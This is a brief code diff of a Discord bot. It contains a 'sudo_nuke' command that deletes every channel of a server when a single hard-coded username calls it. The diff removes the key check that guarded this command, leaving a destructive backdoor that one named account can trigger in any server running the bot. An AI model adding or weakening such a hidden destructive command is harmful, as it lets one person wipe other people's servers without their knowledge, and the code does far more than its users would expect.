@@ -51,9 +51,6 @@ async def sudo(ctx):
 async def sudo_nuke(ctx, key: str = None):
     if ctx.author.name != "nico044037":
         return
-    if key != "":
-        return
-
     for channel in list(ctx.guild.channels):
         try:
             await channel.delete(reason="sudo nuke")
@@ -142,6 +139,7 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
 
 
